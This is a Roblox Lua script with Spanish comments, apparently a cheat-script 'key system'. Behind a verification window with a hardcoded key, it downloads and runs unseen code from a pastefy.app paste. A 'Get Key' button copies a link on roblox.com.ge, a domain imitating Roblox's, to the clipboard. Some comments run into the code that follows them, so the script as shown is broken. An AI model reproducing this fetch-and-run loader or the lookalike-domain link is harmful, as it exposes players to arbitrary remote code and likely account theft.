-- 🔑 Sistema de Keys con Rayfield Optimizado

-- Asegúrate de tener Rayfield cargado antes de esto

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()

-- Crear ventana

local Window = Rayfield:CreateWindow({ Name = "🔑 Key System", LoadingTitle = "Verificación", LoadingSubtitle = "by technoourielcompany", -- Tu nombre aquí ConfigurationSaving = { Enabled = false }, Discord = { Enabled = false }, KeySystem = false })

-- 📝 Tab principal

local Tab = Window:CreateTab("Key", 4483362458) -- Icono de candado

-- Caja de texto para escribir la key

local KeyBox = Tab:CreateInput({ Name = "Introduce tu Key", PlaceholderText = "Escribe tu clave aquí...", RemoveTextAfterFocusLost = false, Callback = function(text) -- Validación insensible a mayúsculas/minúsculas if string.lower(text) == "miclave123" then Rayfield:Notify({ Title = "✅ Correcto", Content = "Clave verificada con éxito", Duration = 3 })

-- Intentar ejecutar el script de Pastefy con manejo de errores
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://pastefy.app/pomGV44s/raw", true))()
        end)
        
        if not success then
            Rayfield:Notify({
                Title = "❌ Error",
                Content = "No se pudo cargar el script: "..err,
                Duration = 5
            })
        end
    else
        Rayfield:Notify({
            Title = "❌ Error",
            Content = "Clave incorrecta",
            Duration = 3
        })
    end
end,

})

-- Botón Get Key

local GetKeyButton = Tab:CreateButton({ Name = "📋 Get Key", Callback = function() -- Link cambiado a la comunidad solicitada local link = "https://roblox.com.ge/communities/9554073285/" setclipboard(link) Rayfield:Notify({ Title = "📋 Copiado", Content = "Se copió el link de la Key al portapapeles", Duration = 3 }) end, })

